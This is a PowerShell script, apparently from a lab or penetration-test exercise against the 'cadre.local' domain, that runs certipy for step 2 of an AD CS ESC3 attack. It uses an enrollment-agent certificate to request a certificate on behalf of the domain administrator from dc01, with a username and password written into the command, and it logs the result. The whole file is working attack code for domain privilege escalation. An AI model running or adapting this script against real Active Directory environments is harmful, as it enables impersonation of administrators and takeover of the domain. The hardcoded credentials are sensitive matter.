# T051 ESC3 step 2 only: on-behalf-of request for administrator (log to file)
$ErrorActionPreference = "Continue"
$certpy = "C:\Users\analyst_t1.CHILD\AppData\Local\Programs\Python\Python312\Scripts\certipy.exe"
Set-Location C:\Tools\cadre-attack
$agentPfx = "C:\Tools\cadre-attack\esc3agent.pfx"
$log = "C:\Tools\cadre-attack\esc3-step2.log"
Remove-Item $log -ErrorAction SilentlyContinue
Write-Output "agent_pfx_exists=$(Test-Path $agentPfx)"
if (Test-Path $agentPfx) {
  & $certpy req -u "chief_command@cadre.local" -p "C0mm@nd_Ch1ef!" -ca cadre-CA -target dc01.cadre.local -template CADRE-ESC3-Target -on-behalf-of "cadre\administrator" -pfx $agentPfx -dynamic-endpoint -timeout 20 -out esc3admin -debug 2>&1 | Out-File -FilePath $log -Encoding ascii
  Write-Output "req_rc=$LASTEXITCODE"
  Write-Output "=== log ==="
  Get-Content $log | Select-Object -Last 25
} else { Write-Output "NO_AGENT_PFX" }
Write-Output "=== ESC3_STEP2_DONE ==="
